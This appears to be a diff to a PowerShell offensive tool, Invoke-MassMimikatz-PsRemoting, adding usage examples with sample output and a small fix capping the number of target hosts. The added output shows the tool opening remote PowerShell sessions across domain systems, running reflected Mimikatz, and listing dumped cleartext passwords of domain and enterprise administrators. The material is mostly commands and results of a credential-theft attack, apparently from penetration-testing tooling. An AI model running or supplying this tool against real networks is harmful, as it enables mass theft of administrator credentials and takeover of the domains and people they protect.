@@ -37,6 +37,46 @@ Command Examples
     # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Then output output to csv.
     Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 
 
+Output Sample 1
+
+    PS C:\> "10.1.1.1" | Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user | ft -AutoSize
+    VERBOSE: Getting list of Servers from provided hosts...
+    VERBOSE: Found 1 servers that met search criteria.
+    VERBOSE: Attempting to create 1 ps sessions...
+    VERBOSE: Established Sessions: 1 of 1 - Processing server 1 of 1 - 10.1.1.1
+    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
+    VERBOSE: Removing ps sessions...
+
+    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
+    ------      --------      --------                         --------------- -----------    
+    test        administrator MyEAPassword!                    Unknown         Unknown    
+    test.domain administrator MyEAPassword!                    Unknown         Unknown    
+    test        myadmin       MyDAPAssword!                    Unknown         Unknown    
+    test.domain myadmin       MyDAPAssword!                    Unknown         Unknown       
+
+Output Sample 2
+
+PS C:\> "10.1.1.1" |Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user -DomainController 10.1.1.2 -AutoTarget | ft -AutoSize
+    VERBOSE: Getting list of Servers from provided hosts...
+    VERBOSE: Getting list of Servers from DC...
+    VERBOSE: Getting list of Enterprise and Domain Admins...
+    VERBOSE: Found 3 servers that met search criteria.
+    VERBOSE: Attempting to create 3 ps sessions...
+    VERBOSE: Established Sessions: 0 of 3 - Processing server 1 of 3 - 10.1.1.1
+    VERBOSE: Established Sessions: 1 of 3 - Processing server 2 of 3 - server1.domain.com
+    VERBOSE: Established Sessions: 1 of 3 - Processing server 3 of 3 - server2.domain.com
+    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
+    VERBOSE: Removing ps sessions...
+
+    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
+    ------      --------      --------                         --------------- -----------    
+    test        administrator MyEAPassword!                    Yes             Yes    
+    test.domain administrator MyEAPassword!                    Yes             Yes     
+    test        myadmin       MyDAPAssword!                    No              Yes     
+    test.domain myadmin       MyDAPAssword!                    No              Yes 
+    test        myuser        MyUserPAssword!                  No              No
+    test.domain myuser        MyUSerPAssword!                  No              No                
+
 
 Todo
     fix loop
@@ -471,6 +511,10 @@ function Invoke-MassMimikatz-PsRemoting
             if($ServerCount -eq 0){
                 Write-Verbose "No target systems were provided."
                 break
+            }
+
+            if($ServerCount -lt $MaxHosts){
+                $MaxHosts = $ServerCount
             }
 
             Write-Verbose "Found $ServerCount servers that met search criteria."            
